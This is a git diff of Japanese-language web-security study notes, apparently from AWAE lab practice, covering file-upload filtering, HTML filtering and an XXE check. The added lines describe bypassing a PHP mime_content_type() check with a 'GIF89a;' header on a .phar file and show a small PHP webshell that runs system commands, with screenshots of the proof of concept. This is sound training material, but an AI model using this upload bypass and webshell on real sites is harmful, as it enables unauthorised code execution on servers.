@@ -214,7 +214,8 @@ class ChildClass extends ParentClass{
 ## session
 ## file upload
 拡張子とMIME Typeをブラックリスト、ホワイトリストで制限。  
-ブラックリストなら回避は容易だけど、ファイルの中身を見て`mime_content_type()`,`finfo_file`とかでMIME Typeを判断する場合はBurp SuiteでContents-Typeを偽装しても無意味。`$_FILE`から得られるMIME Typeで判断してるかどうか注意。    
+ブラックリストなら回避は容易だけど、ファイルの中身を見て`mime_content_type()`,`finfo_file`とかでMIME Typeを判断する場合はBurp SuiteでContents-Typeを偽装しても無意味。`$_FILE`から得られるMIME Typeで判断してるかどうか注意。  
+ただ、拡張子を`evil.phar`としてファイルの先頭に`GIF89a;`を付けとけば`mime_content_type()`はバイパスできて`image/gif`だと思ってくれる。  
 ## HTMLフィルタリング
 ここら辺みたいに入力されたものをユーザーが定義したフィルタリングの関数に通す。  
 大体がHTMLエンティティ化したりHTMLタグを取ったりバックスラッシュを記号前に付与したり？  
@@ -1163,7 +1164,19 @@ function file_mime_type($file) {
 	return $mimetype;
 }
 ```
-
+GIFのヘッダーを入れておけば`mime_content_type()`をバイパスできる！また、拡張子として`.phar`が禁止されてないのでこれでWebshellアップロードできた！  
+```txt
+takabayashi@takabayashi-VirtualBox:~/AWAE$ cat evil.phar 
+GIF89a;
+<?php
+  system('whoami'); # shellcode goes here
+?>
+takabayashi@takabayashi-VirtualBox:~/AWAE$ 
+```
+以下はPOC  
+![image](https://user-images.githubusercontent.com/56021519/107334411-0567f780-6afa-11eb-84cc-5caa5da2cbb2.png)  
+![image](https://user-images.githubusercontent.com/56021519/107334438-10228c80-6afa-11eb-809d-b1dafd6fe1af.png)  
+![image](https://user-images.githubusercontent.com/56021519/107334491-20d30280-6afa-11eb-93ea-da8c98fee0b6.png)  
 ## XXE
 `admin/api.php`の以下にXXEがあるのでは？？  
 と思ったけど、`libxml_disable_entity_loader();`によってXMLの外部参照を禁止しているのでXXE対策はされている。  
